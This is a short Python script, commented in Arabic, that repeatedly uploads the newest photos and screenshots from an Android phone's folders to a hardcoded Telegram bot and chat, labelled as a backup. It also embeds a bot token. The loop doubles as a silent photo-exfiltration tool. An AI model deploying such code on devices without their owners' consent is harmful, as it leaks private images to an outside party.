import os
import time
import requests

# بياناتك الخاصة
BOT_TOKEN = "7820129712:AAH9pZ49S_m8tY8965625902"
CHAT_ID = "6110903337"

# المجلدات التي سيفحصها التطبيق
WATCH_FOLDERS = [
    "/storage/emulated/0/DCIM/Camera",
    "/storage/emulated/0/Pictures/Screenshots",
    "/storage/emulated/0/MyBackup" # المجلد الذي اقترحه الـ AI
]

sent = set()
IMAGE_EXT = (".jpg", ".jpeg", ".png")

def send_file(path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(path, "rb") as f:
            r = requests.post(
                url,
                data={"chat_id": CHAT_ID, "caption": f"✅ Backup: {os.path.basename(path)}"},
                files={"document": f},
                timeout=60
            )
        return r.status_code == 200
    except Exception as e:
        print(f"ERROR_SENDING: {e}")
        return False

def scan():
    for folder in WATCH_FOLDERS:
        if not os.path.exists(folder):
            try: os.makedirs(folder)
            except: continue

        try:
            files = [os.path.join(folder, f) for f in os.listdir(folder) if f.lower().endswith(IMAGE_EXT)]
            # ترتيب الأحدث أولاً
            files.sort(key=os.path.getmtime, reverse=True)

            for path in files[:10]: # فحص أول 10 صور من كل مجلد لضمان الاستقرار
                if path not in sent:
                    if send_file(path):
                        sent.add(path)
                        time.sleep(5) # تأخير لمنع الحظر
        except:
            continue

def main():
    # إرسال تنبيه عند بدء التشغيل
    try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": "🚀 الخدمة الانتقائية تعمل الآن..."})
    except: pass

    while True:
        scan()
        time.sleep(180) # فحص كل 3 دقائق

if __name__ == "__main__":
    main()
